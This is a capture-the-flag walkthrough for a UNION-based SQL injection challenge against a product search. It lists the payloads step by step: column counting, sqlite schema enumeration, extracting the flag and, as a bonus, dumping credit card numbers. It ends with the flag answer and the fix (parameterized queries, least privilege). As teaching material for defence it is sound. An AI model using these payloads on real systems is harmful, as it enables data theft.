# 04 — SQL Injection: UNION Data Extraction · Hard · 250 pts

**Course ref:** Ch05, Lab4 (Mutillidae `' union select ccid,ccnumber,... from credit_cards --`).

## Scenario
A product search shows rows from `SELECT name, price FROM products WHERE name LIKE '%<q>%'`. The flag is in a different table.

## Walkthrough
1. Confirm the injection: `'` → `SQL error: unrecognized token`.
2. Count the columns: `' ORDER BY 1 --` and `' ORDER BY 2 --` work, but `' ORDER BY 3 --` gives an error, so there are **2 columns**.
3. Enumerate the schema (sqlite): `' UNION SELECT name, sql FROM sqlite_master --` shows the `products`, `credit_cards` and `secrets(id, flag)` tables.
4. Dump the data: `' UNION SELECT flag, NULL FROM secrets --`
5. Flag: `FLAG{un1on_based_data_dump}` (bonus: `' UNION SELECT ccnumber, expiration FROM credit_cards --`).

## The bug
`search_page()` concatenates `q` into the query and reflects every returned column (`# ======= VULN HERE =======`).

## The fix
- Use a parameterized query: `con.execute("... WHERE name LIKE ?", (f"%{q}%",))`
- Least privilege: the web app's DB account should only be able to read `products`.
- Return generic errors, not raw SQL errors.
